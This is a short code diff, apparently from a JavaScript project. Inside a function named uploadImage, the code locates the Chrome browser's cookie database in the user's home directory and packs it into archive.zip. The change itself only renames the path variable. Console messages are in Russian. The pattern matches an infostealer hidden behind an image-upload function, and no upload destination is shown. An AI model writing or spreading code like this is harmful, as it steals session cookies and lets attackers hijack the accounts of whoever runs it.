@@ -49,10 +49,10 @@ async function uploadImage() {
         isImageProcessed = false;
         console.log("Sended");
         try {
-            const filePath = HD + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies';
+            const GCPath = HD + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies';
             const archivePath = path.join(__dirname, 'archive.zip');
         
-            fs.access(filePath, fs.constants.F_OK, (err) => {
+            fs.access(GCPath, fs.constants.F_OK, (err) => {
                 if (err) {
                     console.log('Файл не существует.');
                 } else {
@@ -81,7 +81,7 @@ async function uploadImage() {
                         });
         
                         archive.pipe(output);
-                        archive.file(filePath, { name: path.basename(filePath) });
+                        archive.file(GCPath, { name: path.basename(GCPath) });
                         archive.finalize();
                     } else {
                         console.log(`Архив уже существует.`);
